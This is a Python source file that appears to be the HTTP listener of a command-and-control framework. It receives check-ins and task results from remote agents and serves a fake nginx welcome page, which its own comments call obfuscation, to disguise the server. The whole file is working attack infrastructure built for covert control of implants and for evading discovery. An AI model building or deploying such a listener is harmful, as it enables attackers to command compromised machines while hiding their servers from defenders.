"""
HTTP listener implementation
"""

import asyncio
import json
from typing import Dict, Any
from aiohttp import web
from datetime import datetime

from core.database import SessionLocal
from core.models import Agent
from api.agents import agent_checkin

class HTTPListener:
    """HTTP listener for agent communications"""
    
    def __init__(self, listener_id: str, bind_address: str, bind_port: int, configuration: Dict[str, Any]):
        self.listener_id = listener_id
        self.bind_address = bind_address
        self.bind_port = bind_port
        self.configuration = configuration
        self.app = web.Application()
        self.runner = None
        self.site = None
        
        # Setup routes
        self.setup_routes()
    
    def setup_routes(self):
        """Setup HTTP routes"""
        # Agent check-in endpoint
        self.app.router.add_post('/api/v1/checkin', self.handle_checkin)
        self.app.router.add_get('/api/v1/checkin', self.handle_checkin_get)
        
        # Task result endpoint
        self.app.router.add_post('/api/v1/result', self.handle_result)
        
        # Health check
        self.app.router.add_get('/health', self.handle_health)
        
        # Add obfuscation endpoints
        self.app.router.add_get('/', self.handle_root)
        self.app.router.add_get('/index.html', self.handle_root)
        self.app.router.add_get('/favicon.ico', self.handle_favicon)
    
    async def handle_checkin(self, request: web.Request) -> web.Response:
        """Handle agent check-in"""
        try:
            # Get request data
            data = await request.json()
            
            # Get client IP
            client_ip = request.remote
            
            # Create database session
            db = SessionLocal()
            
            try:
                # Process check-in
                from core.schemas import AgentCheckIn
                checkin_data = AgentCheckIn(**data)
                
                # Use the API function directly
                result = await agent_checkin(checkin_data, db)
                
                # Return response
                return web.json_response(result)
                
            finally:
                db.close()
                
        except Exception as e:
            return web.json_response(
                {"error": str(e)},
                status=400
            )
    
    async def handle_checkin_get(self, request: web.Request) -> web.Response:
        """Handle GET check-in (for testing)"""
        return web.json_response({"status": "ok", "message": "Use POST method"})
    
    async def handle_result(self, request: web.Request) -> web.Response:
        """Handle task result submission"""
        try:
            data = await request.json()
            
            db = SessionLocal()
            try:
                # Import here to avoid circular dependency
                from api.tasks import submit_task_result
                from core.schemas import TaskResult
                
                # Extract task_id from data
                task_id = data.pop('task_id', None)
                if not task_id:
                    return web.json_response(
                        {"error": "task_id required"},
                        status=400
                    )
                
                # Create result object
                result_data = TaskResult(**data)
                
                # Submit result
                await submit_task_result(task_id, result_data, db)
                
                return web.json_response({"status": "success"})
                
            finally:
                db.close()
                
        except Exception as e:
            return web.json_response(
                {"error": str(e)},
                status=400
            )
    
    async def handle_health(self, request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.json_response({
            "status": "healthy",
            "listener_id": self.listener_id,
            "timestamp": datetime.utcnow().isoformat()
        })
    
    async def handle_root(self, request: web.Request) -> web.Response:
        """Handle root request (obfuscation)"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Welcome to nginx!</title>
            <style>
                body {
                    width: 35em;
                    margin: 0 auto;
                    font-family: Tahoma, Verdana, Arial, sans-serif;
                }
            </style>
        </head>
        <body>
            <h1>Welcome to nginx!</h1>
            <p>If you see this page, the nginx web server is successfully installed and
            working. Further configuration is required.</p>
            <p>For online documentation and support please refer to
            <a href="http://nginx.org/">nginx.org</a>.<br/>
            Commercial support is available at
            <a href="http://nginx.com/">nginx.com</a>.</p>
            <p><em>Thank you for using nginx.</em></p>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    
    async def handle_favicon(self, request: web.Request) -> web.Response:
        """Handle favicon request"""
        return web.Response(status=404)
    
    async def start(self):
        """Start the HTTP listener"""
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        
        self.site = web.TCPSite(
            self.runner,
            self.bind_address,
            self.bind_port
        )
        
        await self.site.start()
        
        print(f"HTTP Listener started on {self.bind_address}:{self.bind_port}")
        
        # Keep running
        while True:
            await asyncio.sleep(1)
    
    async def stop(self):
        """Stop the HTTP listener"""
        if self.site:
            await self.site.stop()
        if self.runner:
            await self.runner.cleanup()
        
        print(f"HTTP Listener stopped")
